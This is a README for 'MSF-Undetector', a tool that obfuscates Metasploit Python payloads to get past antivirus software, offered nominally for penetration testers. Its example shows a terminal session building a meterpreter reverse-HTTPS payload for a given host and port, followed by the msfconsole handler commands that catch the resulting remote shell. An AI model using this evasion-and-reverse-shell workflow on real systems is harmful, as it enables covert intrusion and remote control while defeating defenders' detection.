# MSF-Undetector
Metasploit python-payload obfuscation, to allow penetration testers bypass Antivirus solutions. Use PyInstaller to create the final, single-file binary.

# Requirements
Linux OS, with metasploit installed. May work as expected on Windows, but not tested for now.

# Example
```
analyser@parrot:~/msfud$ python ./msfud.py
IP Address [LHOST]: 192.168.1.65
Local Port [LPORT]: 443
No platform was selected, choosing Msf::Module::Platform::Python from the payload
No Arch selected, selecting Arch: python from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 51790 bytes

Done! Run msfconsole with the following commands.
--------------------
use exploit/multi/handler
set PAYLOAD python/meterpreter_reverse_https
set LPORT 443
set LHOST 0.0.0.0
SessionExpirationTimeout 0
SessionCommunicationTimeout 0
ExitOnSession false
exploit -j -z
--------------------
Happy Hacking!
analyser@parrot:~/msfud$
```
